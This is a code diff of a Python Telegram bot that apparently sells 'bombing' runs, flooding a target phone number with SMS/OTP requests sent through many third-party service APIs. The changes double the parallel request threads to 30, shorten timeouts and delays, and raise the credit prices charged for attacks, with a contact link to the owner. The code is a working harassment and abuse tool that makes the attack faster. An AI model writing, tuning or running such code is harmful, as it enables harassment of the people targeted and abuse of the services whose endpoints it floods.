@@ -18,7 +18,7 @@ stop_bombing = {}
 total_requests = {}
 current_target = {}
 
-# ---------- LOAD SERVICES ----------
+# ---------- LOAD SERVICES (SAME API) ----------
 def load_services():
     try:
         with open('services.json', 'r') as f:
@@ -58,11 +58,11 @@ def send_request(svc, phone):
     
     try:
         if method == 'GET':
-            r = requests.get(url, headers=headers, timeout=3)
+            r = requests.get(url, headers=headers, timeout=2)
         elif method == 'POST':
-            r = requests.post(url, headers=headers, json=data, timeout=3)
+            r = requests.post(url, headers=headers, json=data, timeout=2)
         elif method == 'PUT':
-            r = requests.put(url, headers=headers, json=data, timeout=3)
+            r = requests.put(url, headers=headers, json=data, timeout=2)
         else:
             return False
         return r.status_code < 500
@@ -86,11 +86,11 @@ def bomb_thread(phone, total, user_id):
             return False
     
     while sent < total and not stop_bombing.get(user_id, False):
-        # 15 APIs ek saath parallel mein
-        batch_size = 15
+        # 🔥 30 APIs ek saath parallel mein
+        batch_size = 30
         batch = services[:batch_size]
         
-        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
             results = executor.map(send_one, batch)
             for ok in results:
                 if stop_bombing.get(user_id, False) or sent >= total:
@@ -104,9 +104,8 @@ def bomb_thread(phone, total, user_id):
                 if sent >= total:
                     break
         
-        # Shuffle for next batch
         random.shuffle(services)
-        time.sleep(0.01)  # Minimal delay
+        time.sleep(0.005)  # 🔥 Delay 0.01 se 0.005 karo
     
     add_bomb_stats(user_id, phone, sent, success, failed)
     return sent, success, failed
@@ -328,12 +327,17 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 👤 **Owner:** {OWNER}
 
-💎 **Prices:**
-• 50 credits - ₹10
-• 100 credits - ₹20
-• 250 credits - ₹45
-• 500 credits - ₹80
-• 1000 credits - ₹150"""
+💎 **Credit Prices:**
+• **20 credits** - ₹40
+• **50 credits** - ₹100
+• **100 credits** - ₹190
+• **250 credits** - ₹450
+• **500 credits** - ₹850
+• **1000 credits** - ₹1600
+• **2500 credits** - ₹3750
+• **5000 credits** - ₹7000
+
+📩 Click below to contact owner!"""
         
         keyboard = [
             [InlineKeyboardButton("👤 Contact Owner", url="https://t.me/lordzenox")],
@@ -589,7 +593,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     print("=" * 50)
-    print(f"🤖 {BOT_NAME} (SPEED OPTIMIZED)")
+    print(f"🤖 {BOT_NAME} (SPEED OPTIMIZED - API SAME)")
     print(f"📊 Loaded {len(SERVICES)} APIs")
     print(f"👑 Owner: {OWNER}")
     print("=" * 50)
